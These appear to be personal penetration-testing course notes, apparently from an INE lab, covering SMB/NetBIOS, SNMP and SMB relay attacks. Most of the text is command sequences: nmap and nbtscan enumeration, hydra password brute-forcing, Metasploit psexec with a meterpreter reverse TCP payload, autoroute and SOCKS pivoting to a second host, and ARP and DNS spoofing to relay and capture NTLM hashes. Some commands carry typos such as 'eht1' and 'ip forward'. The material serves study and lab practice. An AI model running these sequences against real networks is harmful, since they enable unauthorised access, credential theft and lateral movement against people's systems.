## Tools

## Network attack

### SMB & NetBIOS

- NetBIOS = API / set of protocols -> provide communications services on LAN
- 3 services (Name Service - NS - 137 /Datagram Service DGS - 138 / Session Service - SSN - 139)
- SMB = File sharing protocol / 3 versions : 1/2.0-2.1/3+
- SMB on port 445 today or 139 if on NetBIOS for retrocompatibility
- modern networks rely primarly on SMB only for file/printer sharing, and using new protocol like DNS instead of NetBIOS for resolution name for ex.


#pivoting #smb #autoroute
```bash

#NetBIOS
#scan networks for netBIOS name infos
nbtscan 10.4.30.0/24

nmblookup -A  10.4.30.139

#smb
ls -la /usr/share/nmap/scripts/ | grep -e "smb-*"
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
#anonymous password
smbclient -L demo.ine.local
nmap -p445 --script smb-enum-users.nse demo.ine.local
#with the user you get
vim users.txt
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb -t 4

psexec.py administrator@demo.ine.local
password


#msf psexec
msfconsole
search psexec
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password
set windows/x64/meterpreter/reverse_tcp

#pivoting
#in meterpreter session
shell
ping demo1.ine.local
exit
#back in meterpreter session
run autoroute -s 10.4.26.0/20 #subnet of the second victim

#open another shell
cat /etc/proxychains4.conf
#check info like the listening port
#here it s 9050

#back in meterpreter shell

background
search socks
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050 #same as proxichains port conf file
run

#second shell
netstat -antp
#check for the 0.0.0.0:9050

#we can now ping the second host
proxychains nmap demo1.ine.local -Pn -sV -p 445

#go back in meterpreter session on victim 1
migrate -N explorer.exe
shell
#in the scenario, both victim shares files on smb so as we're on victim 1 we can simply now enumerate shares of victim 2
net view 10.4.26.4 #victim 2
net use D: \\10.4.26.4\Documents

```

### SNMP

- SNMP (Simple Network Management Protcole)
- app layer protocol, UDP, 161 = queries, 162 = traps (notifications) / 3 versions : SNMPv1-v2-v3
- for monitoring, managing network devices / admin can query devices status infos

attack objectives
- query SNMP enabled device to gather infos
- query weak community strings, retrieve network infos, collect users and groups, etc

Demo
```bash

nmap -sV -sU -p 161 demo.ine.local
ls -la /usr/share/nmap/scripts | grep -e "snmp"
ls -la /usr/share/nmap/nselib/data | grep -e "snmp"

nmap -sU -sV -p 161 --script snmp-brute demo.ine.local
#show 3 community strings : public, private, secret

snmpwalk -v 1 -c public demo.ine.local
#not really readible

nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_info

hydra -l admnistrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb

msfconsole
search psexec
#...

```

### SMB Relay
#smb
- MITM attack type, intercepts SMB (server message block)traffic, manipulates it, relays to legitimate server
- could gain unauth access to ressources / perform malicious actions

attacks scenario :
- Intercept, can be done with ARP spoofing, DNS poisoning or setting up a rogue SMB server
- Capture auth : in legitimate connection, client sends auth data to server, might include NTLM hashes
- relaying to legitimate server : impersonate user with NTLM hashes 
- Gaining access
![[Pasted image 20250424221902.png]]
![[Pasted image 20250424221950.png]]

Demo
```bash

#setup the smb relay
msfconsole
search smb_relay
use exploit/windows/smb/smb_relay
set SRVHOSTS 172.16.5.101
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
run

#open new tab
#emulate dns records / fake dns/host file 
echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns

#open new tab
echo 1 > /proc/sys/net/ipv4/ip forward

#hey client i'm the GW
arpspoof -i eht1 -t 172.16.5.5 172.16.5.1

#open new tab
#hey GW i'm the client
arpspoof -i eht1 -t 172.16.5.1 172.16.5.5

#resume : a chaque requete smb, on va l intercpeter et dire que l'ip server SMB et celle de notre machine

#go back to msf
exploit
jobs

#wait in msf tab for NTLM dump
session 1
#auth/system

```